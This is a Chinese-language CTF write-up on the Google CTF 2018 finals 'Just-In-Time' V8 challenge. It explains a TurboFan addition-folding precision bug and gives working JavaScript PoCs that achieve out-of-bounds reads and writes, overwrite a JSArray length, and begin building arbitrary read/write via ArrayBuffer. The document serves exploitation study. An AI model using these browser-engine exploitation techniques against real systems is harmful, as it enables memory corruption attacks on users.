> 原文链接: https://www.anquanke.com//post/id/229554 


# 浅析 V8-turboFan（下）


                                阅读量   
                                **251238**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01913d18dabde8c409.jpg)](https://p4.ssl.qhimg.com/t01913d18dabde8c409.jpg)



基础概念介绍到这里，接下来我们学习一道CTF题来练练手。

## 六、Google CTF 2018(final) Just-In-Time

### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="1.%20%E7%AE%80%E4%BB%8B"></a>1. 简介

Google CTF 2018(final) Just-In-Time 是 v8 的一道基础题，适合用于v8即时编译的入门，其目标是执行`/usr/bin/gnome-calculator`以弹出计算器。在这里我们通过这道题目来学习一下v8的相关概念。

这道题的题解在安全客上有很多，但由于这是笔者初次接触 v8 的题，因此这次我们就详细讲一下其中的细节。
<li>题目来源 – [ctftime – task6982](https://ctftime.org/task/6982)
</li>
<li>Just-In-Time 官方附件及其exp – [github](https://github.com/google/google-ctf/tree/master/2018/finals/pwn-just-in-time)
</li>
### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="2.%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"></a>2. 环境搭建

题目给的附件（ctftime中的附件，不是github上的附件）内含一个已编译好的chromium和两个patch文件。
<li>
`nosandbox.patch` : 该文件用于关闭renderer的沙箱机制。</li>
<li>
`addition-reducer.patch` : 本题的重头戏。</li>
<li>
`chromium` ：版本号为`70.0.3538.9`的二进制包（已打patch）</li>
不过由于笔者已经搭了v8的环境，因此决定采用源码编译的方式来编译出一个v8，这样的好处是**可以更方便的进行调试**。该题的v8版本为**7.0.276.3**，可以通过`chrome://version`来获取，或者去[OmahaProxy CSV Viewer](https://omahaproxy.appspot.com/)中查询。

```
# 开代理
sudo service privoxy start
export https_proxy=http://127.0.0.1:8118
export http_proxy=http://127.0.0.1:8118
# 切换chromium版本
cd v8/
git checkout 7.0.276.3 # 如果需要force，则添加-f参数。gclient同样如此。
gclient sync # 这一步需要代理（很重要）,需要N久,取决网速。

# gclient sync完成后再打个patch
git apply ../../../CTF/GoogleCTF2018_Just-In-Time/addition-reducer.patch
# 设置一下编译参数
tools/dev/v8gen.py x64.debug
# 设置允许优化checkbounds
echo "v8_untrusted_code_mitigations = false" &gt;&gt; out.gn/x64.debug/args.gn
# 编译
ninja -C out.gn/x64.debug
```

> 为什么要设置`v8_untrusted_code_mitigations = false`，请查看上面关于`SimplifiedLoweringPhase`中checkbounds优化的简单讲解。
这里可能是因为出题者忘记给出v8的编译参数了，否则默认的编译参数将**无法利用漏洞**。

### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="3.%20%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"></a>3. 漏洞成因
<li>新打的patch将在turboFan中的`TypedLoweringPhase`中添加了一种优化方式。
<pre><code class="lang-cpp hljs">Reduction DuplicateAdditionReducer::Reduce(Node* node) `{`
  switch (node-&gt;opcode()) `{`
    case IrOpcode::kNumberAdd:
      return ReduceAddition(node);
    default:
      return NoChange();
  `}`
`}`

Reduction DuplicateAdditionReducer::ReduceAddition(Node* node) `{`
  DCHECK_EQ(node-&gt;op()-&gt;ControlInputCount(), 0);
  DCHECK_EQ(node-&gt;op()-&gt;EffectInputCount(), 0);
  DCHECK_EQ(node-&gt;op()-&gt;ValueInputCount(), 2);

  Node* left = NodeProperties::GetValueInput(node, 0);
  if (left-&gt;opcode() != node-&gt;opcode()) `{`
    return NoChange();
  `}`

  Node* right = NodeProperties::GetValueInput(node, 1);
  if (right-&gt;opcode() != IrOpcode::kNumberConstant) `{`
    return NoChange();
  `}`

  Node* parent_left = NodeProperties::GetValueInput(left, 0);
  Node* parent_right = NodeProperties::GetValueInput(left, 1);
  if (parent_right-&gt;opcode() != IrOpcode::kNumberConstant) `{`
    return NoChange();
  `}`

  double const1 = OpParameter&lt;double&gt;(right-&gt;op());
  double const2 = OpParameter&lt;double&gt;(parent_right-&gt;op());
  Node* new_const = graph()-&gt;NewNode(common()-&gt;NumberConstant(const1+const2));

  NodeProperties::ReplaceValueInput(node, parent_left, 0);
  NodeProperties::ReplaceValueInput(node, new_const, 1);

  return Changed(node);
`}`
</code></pre>
该优化方式将优化诸如`x + 1 + 2`这类的表达式为`x + 3`，即以下的Case4：
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010984811e0f1a2564.png)
</li>
- 但是，还记得我们之前所提到的，NumberConstant的内部实现使用的是`double`类型。这就意味着这样的优化可能存在精度丢失。举个例子：[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01fd79e6a2e5d5e986.png)即，`x + 1 + 1`不一定会等于`x + 2`！所以这种优化是存在问题的。
<li>这是为什么呢？原因是浮点数的IEEE764标准。当一个浮点数越来越大时，有限的空间只能保留高位的数据，因此一旦浮点数的值超过某个界限时，低位数值将被舍弃，此时数值不能全部表示，存在精度丢失。而这个界限正是 $2^`{`53`}`-1 = 9007199254740991$，即上图中的`MAX_sAFE_INTEGER`。
<pre><code class="lang-cpp hljs">// 以下是double结构的9007199254740991值，可以看到正好是double结构所能存放的最大整数。
+------+--------------+------------------------------------------------------+‭
| sign |    exponent  |                fraction                              |
+------+--------------+------------------------------------------------------+
|   0  |  00000000001 | 1111111111111111111111111111111111111111111111111111‬ |
+------+--------------+------------------------------------------------------+
</code></pre>
</li>
<li>由于`x + 1 + 1 &lt;= x + 2`，因此某个`NumberAdd`结点的`Type`，也就是**其Range将会小于该结点本身的值** 。例如
<ul>
<li>
`9007199254740992` 连续两次**+1**后，由于精度丢失，导致最后一个`NumberAdd`结点的Type为`Range(9007199254740992,9007199254740992)`。</li>
- 但由于执行了patch中的优化，导致最后一个加法操作实际的结果为`9007199254740994`，大于Range的最大值。
- 因此，如果使用这个结果值来访问数组的话，可能存在越界读写的问题，因为若预期index小于length的最小范围时，checkBounds结点将会被优化，此时比**预期index** 范围更大的 **实际index** 很有可能成功越界。
### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="4.%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>4. 漏洞利用

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="a.%20OOB"></a>a. OOB

##### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="1)%20%E6%9E%84%E9%80%A0POC"></a>1) 构造POC
<li>我们先试一下POC
<pre><code class="lang-js hljs javascript">function f(x)
`{`
    const arr = [1.1, 2.2, 3.3, 4.4, 5.5]; // length =&gt; Range(5, 5)
    let t = (x == 1 ? 9007199254740992 : 9007199254740989);
    // 此时 t =&gt; 解释/编译 Range(9007199254740989, 9007199254740992)
    t = t + 1 + 1;
    /* 此时 t =&gt; 
        解释：Range(9007199254740991, 9007199254740992)
        编译：Range(9007199254740991, 9007199254740994)
    */
    t -= 9007199254740989;
    /* 此时 t =&gt; 
        解释：Range(2, 3)
        编译：Range(2, 5)
    */
    return arr[t];
`}`

console.log(f(1));
%OptimizeFunctionOnNextCall(f);
console.log(f(1));
</code></pre>
Type后的结果如下，可以看到checkbounds的检查可以通过：
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01485d798a0cfe212f.png)
因此该checkbounds将在`SimplifiedLoweringPhase`中被优化：
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0181ce2dab56a05fbc.png)
输出的结果如下：
<blockquote>注：输出结果中的`DuplicateAdditionReducer::ReduceAddition Called/Success`，是打patch后的输出内容，在原v8中没有该输出。</blockquote>
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014d583bf660b539cc.png)
可以看到，成功将两个+1操作优化为+2，并在最末尾处成功**越界读取**到一个数组外的元素。
</li>
<li>这里需要说一下构建poc可能存在的问题：
<ul>
<li>POC1：**无 if 分支**
<pre><code class="lang-js hljs javascript">function f(x)
`{`
    const arr = [1.1, 2.2, 3.3, 4.4, 5.5];
    // 这里没有使用上面if xxx这样的语句，直接一个整数赋值

    // let t = Number.MAX_SAFE_INTEGER + 1; 
    let t = 9007199254740992; 
    t = t + 1 + 1;
    t -= 9007199254740989;
    return arr[t];
`}`

console.log(f(1));
%OptimizeFunctionOnNextCall(f);
console.log(f(1));
</code></pre>
**问题点**：由于函数中常数与常数相加减，因此在执行`TypedLoweringPhase`中的`ConstantFoldingReducer`时，三个算数表达式会直接优化为一个常数，这样就没办法执行`DuplicateAdditionReducer`。
[![](https://p5.ssl.qhimg.com/t015892c7f5030b1fc4.png)](https://p5.ssl.qhimg.com/t015892c7f5030b1fc4.png)
**解决方法**：使用一个`if`分支，这样就可以通过`phi`结点来间接设置`Range`。
</li>
> 以下是一些玄学问题。
<li>POC2：**使用`Number.MAX_SAFE_INTEGER`**
<pre><code class="lang-js hljs javascript">function f(x)
`{`
  const arr = [1.1, 2.2, 3.3, 4.4, 5.5];
    let t = (x == 1 ? Number.MAX_SAFE_INTEGER + 1 
        : Number.MAX_SAFE_INTEGER - 2);
    t = t + 1 + 1;
    t -= (Number.MAX_SAFE_INTEGER - 2);
    return arr[t];
`}`

console.log(f(1));
%OptimizeFunctionOnNextCall(f);
console.log(f(1));
</code></pre>
**问题点**：在`GraphBuilderPhase`中，type feedback推测目标函数的参数只会为`1`，因此turboFan推测函数中的条件判断式**“恒”成立**，故在`InliningPhase`中优化`merge`结点，使得变量`t`始终为一个常数。
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t011c9be76623c3eb9b.png)
之后就执行`TypedLoweringPhase`中的`ConstantFoldingReducer`再次将其优化为一个常数，以至于无法执行`DuplicateAdditionReducer`优化。
通过turbolizer我们可以看出，若判断条件为真，则将优化好的结果输出；若判断条件为假，则说明type feedback出现错误，需要执行deopt。
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0180bbd5bad494b8f7.png)
<blockquote>
至于为什么先前的poc不会优化merge结点，而当前这个poc会优化merge结点，
这个问题仍然需要进一步探索。
</blockquote>
**解决方法**：
<ol>
<li>不同时在 if 语句的两个分支处使用`Number.MAX_SAFE_INTEGER`
<pre><code class="lang-js hljs javascript"> function f(x)
 `{`
     const arr = [1.1, 2.2, 3.3, 4.4, 5.5];
     let t = (x == 1 ? Number.MAX_SAFE_INTEGER + 1 
         // 修改了此处
         : 9007199254740989);
     t = t + 1 + 1;
     t -= (Number.MAX_SAFE_INTEGER - 2);
     return arr[t];
 `}`

 console.log(f(1));
 %OptimizeFunctionOnNextCall(f);
 console.log(f(1));
</code></pre>
</li>
<li>在执行`%OptimizeFunctionOnNextCall`前，使函数调用传入的参数**不单一**:
<pre><code class="lang-js hljs javascript"> function f(x)
 `{`
     const arr = [1.1, 2.2, 3.3, 4.4, 5.5];
     let t = (x == 1 ? Number.MAX_SAFE_INTEGER + 1 
           : Number.MAX_SAFE_INTEGER - 2);
     t = t + 1 + 1;
     t -= (Number.MAX_SAFE_INTEGER - 2);
   return arr[t];
 `}`

 console.log(f(1));
 console.log(f(0));  // 添加了此行
 %OptimizeFunctionOnNextCall(f);
 console.log(f(1));
</code></pre>
</li>
</ol>
</li>
<li>POC3：**不使用`let/var/const`修饰词**
<pre><code class="lang-js hljs javascript">function f(x)
`{`
    // 错误：arr前没有let、var或者const
    arr = [1.1, 2.2, 3.3, 4.4, 5.5];
    // 错误：t 前没有let
    t = (x == 1 ? 9007199254740992 : 9007199254740989);
    t = t + 1 + 1;
    t -= 9007199254740989;
    return arr[t];
`}`

console.log(f(1));
%OptimizeFunctionOnNextCall(f);
console.log(f(1));
</code></pre>
**问题点**：经过gdb动态调试可知，若数组前没有修饰词，则`CheckBounds`的上一个结点`LoadField`结点将不会被`LoadEliminationPhase`优化，这样使得数组`length`结点的范围最大值为134217726，最后导致无法成功优化`CheckBounds`结点：
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0160850a565566e4b3.png)
同时，若变量`t`前没有修饰词，则越界的`add`操作将被`check`出，进而设置值为`inf/NaN`，之后的减法就无法计算出我们所期望的Range值：
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0119a2691179f2ba47.png)
**解决方法**：添加修饰词。
<blockquote>为什么修饰词会影响到结点的建立等等？这其中的内容同样也需要进一步的探索。</blockquote>
</li>
<li>POC4：使用**整数数组**
<pre><code class="lang-js hljs javascript">  function f(x)
  `{`
      const arr = [1, 2, 3, 4, 5];
      let t = (x == 1 ? 9007199254740992 : 9007199254740989);
      t = t + 1 + 1;
      t -= 9007199254740989;
      return arr[t];
  `}`

  console.log(f(1));
  %OptimizeFunctionOnNextCall(f);
  console.log(f(1));
</code></pre>
**问题点**：执行`console.log`时崩溃：
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01958e2bf5506de2a1.png)
**解决方法**：更改数组类型。经过一番测试，发现貌似只能改成**浮点数数组**，改成其他类型的输出都会**崩溃**。
</li>
- 小结：构造POC需要重复多次 **修改代码 =&gt; 观察输出 =&gt; 从turbolizer中查看结点图 =&gt; 分析错误原因** 这个过程，有时还需要给源码打patch和上gdb调试，需要耐心。
> 为什么修饰词会影响到结点的建立等等？这其中的内容同样也需要进一步的探索。
1. 能否成功执行`DuplicateAdditionReducer`优化
1. 能否成功优化`CheckBounds`结点。
如果这两个条件都满足，那基本上构建出的POC可以OOB了。

##### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="2)%20%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96"></a>2) 越界读取

POC有了，那我们试着看一下越界读取到的内存位置，

不出以外的话应该是最后一个元素`5.5`的下一个8位数据：

```
function f(x)
`{`
    let arr = [1.1, 2.2, 3.3, 4.4, 5.5];
    let t = (x == 1 ? 9007199254740992 : 9007199254740989) + 1 + 1;
    t -= 9007199254740989;
    console.log(arr[t]);
    // 将arr数组详细信息输出
    %DebugPrint(arr);
`}`

f(1);
%OptimizeFunctionOnNextCall(f);
f(1);
// 下断点，使v8在gdb中暂停
%SystemBreak();
```

启动GDB，可以看到 d8 自动暂停执行：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01265e372a59fa27b7.png)

之后我们可以找到DebugPrint出的数组内存地址：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t013d92abbb2bbc39c9.png)

每个Object内部都有一个map，该map用于描述对应结构的相关属性。其中包括了当前Object的实例大小，以及一些供GC使用的信息。通过上面的输出，我们可以得到，当前JSArray的实例大小只有32字节。

> map的具体信息请查阅源码 src/objects/map.h 中的注释。

因此，数组中的其他元素肯定存放于另一个数组，而这个数组的类型为`FixedDoubleArray`，其地址存放于JSArray中。

> 需要注意的是：v8 中的指针值大多被打上了tag，以便于区分某个值是pointer还是smi。
因此在gdb使用某个地址时，最低位需要手动置0。

以下是某个 JSArray 的内存布局：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0171204d56c0fd76d0.png)

注意到 JSArray中，第四个8字节数据（即上图中的`0x0000000500000000`）存放的是当前数组的length（5），即便数组元素并没有存放在当前这块内存上。

```
// v8/src/objects/js-array.h
// static const int v8::internal::JSObject::kHeaderSize = 24
static const int kLengthOffset = JSObject::kHeaderSize;
```

回到刚刚的话题，数组的值被存放在`FixedDoubleArray`中，因此我们输出一下内存布局看看：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01ed5f5be204a9474b.png)

可以看到，它越界读取到的数据与先前猜测的一致，即最后一个元素的下一个8字节数据。

同时我们还可以从 gdb 的输出中注意到，一个 JSArray的length 即在 JSArray 中保存，又在 FixedDoubleArray 中存放着，这个也可以在源码中直接定位到操作：

```
// v8/src/objects/js-array-inl.h
void JSArray::SetContent(Handle&lt;JSArray&gt; array,
                         Handle&lt;FixedArrayBase&gt; storage) `{`
  EnsureCanContainElements(array, storage, storage-&gt;length(),
                           ALLOW_COPIED_DOUBLE_ELEMENTS);

  DCHECK(
      (storage-&gt;map() == array-&gt;GetReadOnlyRoots().fixed_double_array_map() &amp;&amp;
       IsDoubleElementsKind(array-&gt;GetElementsKind())) ||
      ((storage-&gt;map() != array-&gt;GetReadOnlyRoots().fixed_double_array_map()) &amp;&amp;
       (IsObjectElementsKind(array-&gt;GetElementsKind()) ||
        (IsSmiElementsKind(array-&gt;GetElementsKind()) &amp;&amp;
         Handle&lt;FixedArray&gt;::cast(storage)-&gt;ContainsOnlySmisOrHoles()))));
  // length既保存在 JSArray 中，也保存在 FixedArrayBase里
  array-&gt;set_elements(*storage);
  array-&gt;set_length(Smi::FromInt(storage-&gt;length()));
`}`
```

但实际上， FixedDoubleArray 中的 length 只用于提供有关固定数组分配的信息，而越界检查只会检查 JSArray 的length，这意味着我们**必须修改 JSArray 的 length 才可以进行任意地址读写**。

> 以下是检测数组访问是否越界的代码：

```
// v8/src/ic/ic.cc
bool IsOutOfBoundsAccess(Handle&lt;Object&gt; receiver, uint32_t index) `{`
  uint32_t length = 0;
  if (receiver-&gt;IsJSArray()) `{`
    // 获取 JSArray 的 length
    JSArray::cast(*receiver)-&gt;length()-&gt;ToArrayLength(&amp;length);
  `}` else if (receiver-&gt;IsString()) `{`
    length = String::cast(*receiver)-&gt;length();
  `}` else if (receiver-&gt;IsJSObject()) `{`
    length = JSObject::cast(*receiver)-&gt;elements()-&gt;length();
  `}` else `{`
    return false;
  `}`
  // 判断是否越界
  return index &gt;= length;
`}`

KeyedAccessLoadMode GetLoadMode(Isolate* isolate, Handle&lt;Object&gt; receiver,
                                uint32_t index) `{`
  // 一开始就判断越界
  if (IsOutOfBoundsAccess(receiver, index)) `{`
    // ...
  `}`
  return STANDARD_LOAD;
`}`

/*
函数调用栈帧：
    #0  v8::internal::(anonymous namespace)::IsOutOfBoundsAccess
    #1  v8::internal::(anonymous namespace)::GetLoadMode
    #2  v8::internal::KeyedLoadIC::Load
    #3  v8::internal::__RT_impl_Runtime_KeyedLoadIC_Miss
    #4  v8::internal::Runtime_KeyedLoadIC_Miss
    #5  Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
    ....
*/
```

为了验证上述内容的正确性，笔者手动用gdb修改了 JSArray 的 length，发现在 release 版本的v8下**可以越界读取**。但在 debug 版本下，会触发`FixedArray`中的`DCHECK`检查导致崩溃：

```
// v8/src/objects/fixed-array-inl.h
DCHECK(index &gt;= 0 &amp;&amp; index &lt; this-&gt;length());
```

因此在编译 debug 版本的 v8 时，需要手动注释掉`src/objects/fixed-array-inl.h` 中越界检查的DCHECK

> 请勿直接编译 release 版本的v8来关闭DCHECK，这会大大提高调试难度。

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="b.%20%E6%9E%84%E9%80%A0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99"></a>b. 构造任意地址读写

##### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="1)%20JSArray%20%E4%BF%AE%E6%94%B9%20length"></a>1) JSArray 修改 length
<li>我们将 FixedArray 的内存布局输出，可以发现 JSArray 和 FixedArray 的数据是**紧紧相邻**的，且 FixedArray 位于低地址处，这为我们修改 JSArray 的 length 提供了一个非常好的条件：[![](https://p1.ssl.qhimg.com/t01adce27b94266fa89.png)](https://p1.ssl.qhimg.com/t01adce27b94266fa89.png)
</li>
<li>现在我们可以试着越界修改一下 JSArray 的 length。需要注意我们必须越界四格才能修改到length，因此需要稍微修改一下POC越界的范围：
<pre><code class="lang-js hljs javascript">function f(x)
`{`
    let arr = [1.0, 1.1, 1.2, 1.3, 1.4, 1.5, 1.6]; // length =&gt; Range(7, 7)
    let t = (x == 1 ? 9007199254740992 : 9007199254740989);
    // 此时 t =&gt; 解释/编译 Range(9007199254740989, 9007199254740992)
    t = t + 1 + 1;
    /* 此时 t =&gt; 
        解释：Range(9007199254740991, 9007199254740992)
        编译：Range(9007199254740991, 9007199254740994)
    */
    t -= 9007199254740990;
    /* 此时 t =&gt; 
        解释：Range(1, 2)
        编译：Range(1, 4)
    */
    t *= 2;
    /* 此时 t =&gt; 
        解释：Range(2, 4)
        编译：Range(2, 8)
    */
    t += 2;
    /* 此时 t =&gt; 
        解释：Range(4, 6)
        编译：Range(4, 10)
    */
    console.log(arr[t]);
    %DebugPrint(arr);
`}`

f(1);
%OptimizeFunctionOnNextCall(f);
f(1);
%SystemBreak();
</code></pre>
最后输出了`1.4853970537e-313`，用gdb转换成int类型，刚好为`7`，这就意味着我们现在可以修改 JSArray 的 length 了。
试一试：
<pre><code class="lang-js hljs javascript">var oob_arr = [];
function opt_me(x)
`{`
    oob_arr = [1.0, 1.1, 1.2, 1.3, 1.4, 1.5, 1.6];
    let t = (x == 1 ? 9007199254740992 : 9007199254740989);
    t = t + 1 + 1;
    t -= 9007199254740990;
    t *= 2;
    t += 2;
    // 将 smi(1024) 写入至 JSArray 的 length处
    oob_arr[t] = 2.1729236899484389e-311; // 1024.f2smi
`}`
// 尝试优化
for(let i = 0; i &lt; 0x10000; i++)
    opt_me(1);
// 试着越界读取一下
console.log(oob_arr.length);
console.log(oob_arr[100]);
%SystemBreak();
</code></pre>
可以发现，**越界读写成功**！
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01d08f8b7070b72293.png)
在附件chromium中试试发现也是可以正常工作的：
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d8efe460e1943b8d.png)
但我们发现 v8 和 chromium 输出的值不一样，所以调试 d8 编写 JS 后还需要到 chromium 这边验证一下。
<blockquote>这里有个注意点，在被turboFan优化过的函数中读写数组，其越界判断不会通过我们所熟知的`Runtime_KeyedLoadIC_Miss`函数，因此越界操作最好在被优化的函数外部执行。</blockquote>
</li>
<li>现在我们已经成功让 JSArray 实现大范围**向后**越界读取，但这明显不够，因为 JSArray 只能**向后**越界读写 `0x40000000`字节，有范围限制。
<pre><code class="lang-cpp hljs">// v8/src/objects/fixed-array.h
#ifdef V8_HOST_ARCH_32_BIT
  static const int kMaxSize = 512 * MB;
#else
  static const int kMaxSize = 1024 * MB;
#endif  // V8_HOST_ARCH_32_BIT
</code></pre>
看样子我们可以再次声明一个 JSArray ，然后越界修改其 elements 地址以达到任意地址读写的目的？实际上是不行的，因为每一个 element 都有其对应的 map 指针，如果我们要通过修改 elements 地址来进行任意读的话，我们还必须在目标地址手动伪造一个 fake map，但通常我们是没有办法来伪造的。
因此接下来我们将引入漏洞利用中比较常用的类型：**ArrayBuffer**。
</li>
##### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="2)%20ArrayBuffer"></a>2) ArrayBuffer
<li>
`ArrayBuffer`是漏洞利用中比较常见的一个对象，这个对象用于表示通用的、固定长度的原始二进制数据缓冲区。通常我们不能直接操作`ArrayBuffer`的内容，而是要通过类型数组对象（JSTypedArray）或者`DataView`对象来操作，它们会将缓冲区中的数据表示为特定的格式，并且通过这些格式来读写缓冲区的内容。<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0166758fae90ab8ef0.png)而 ArrayBuffer中的缓冲区内存，就是 v8 中 JSArrayBuffer 对象中的 **backing_store** 。</li>
<li>需要注意的是，ArrayBuffer 自身也有 element。这个 element 和 backing_store **不是同一个东西**：element 是一个 JSObject，而 backing_store 只是单单一块堆内存。 因此，单单修改 element 或 backing_store 里的数据都不会影响到另一个位置的数据。以下是一个简单的 JS 测试代码：
<pre><code class="lang-js hljs javascript">buffer = new ArrayBuffer(0x400);
int = new Int32Array(buffer);
int[2] = 1024;
buffer[1] = 0x200;
%DebugPrint(buffer);
%SystemBreak();
</code></pre>
浏览器中输出的结果：
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01d39c04f7c2286646.png)
gdb中输出的地址信息：
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01a83948ad5664ca1f.png)
</li>
